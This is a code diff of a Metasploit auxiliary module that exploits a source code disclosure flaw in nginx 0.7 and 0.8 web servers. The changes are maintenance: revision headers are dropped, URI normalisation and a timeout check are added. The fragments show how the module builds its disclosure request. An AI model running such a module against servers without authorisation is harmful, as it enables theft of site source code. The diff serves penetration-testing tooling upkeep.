@@ -1,8 +1,4 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # web site for more information on licensing and terms of use.
@@ -20,7 +16,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'           => 'Nginx Source Code Disclosure/Download',
-			'Version'        => '$Revision$',
 			'Description'    => %q{
 					This module exploits a source code disclosure/download vulnerability in
 				versions 0.7 and 0.8 of the nginx web server. Versions 0.7.66 and 0.8.40
@@ -49,11 +44,12 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def target_url
-		"http://#{vhost}:#{rport}#{datastore['URI']}"
+		uri = normalize_uri(datastore['URI'])
+		"http://#{vhost}:#{rport}#{uri}"
 	end
 
 	def run_host(ip)
-		uri = datastore['URI']
+		uri = normalize_uri(datastore['URI'])
 		path_save = datastore['PATH_SAVE']
 
 		vuln_versions = [
@@ -73,10 +69,13 @@ class Metasploit3 < Msf::Auxiliary
 			res = send_request_raw(
 				{
 					'method'  => 'GET',
-					'uri'     => "/#{uri}#{get_source}",
+					'uri'     => "#{uri}#{get_source}",
 				}, 25)
 
-			if res
+			if res.nil?
+				print_error("#{target_url} - nginx - Connection timed out")
+				return
+			else
 				version = res.headers['Server']
 				http_fingerprint({ :response => res })
 			end
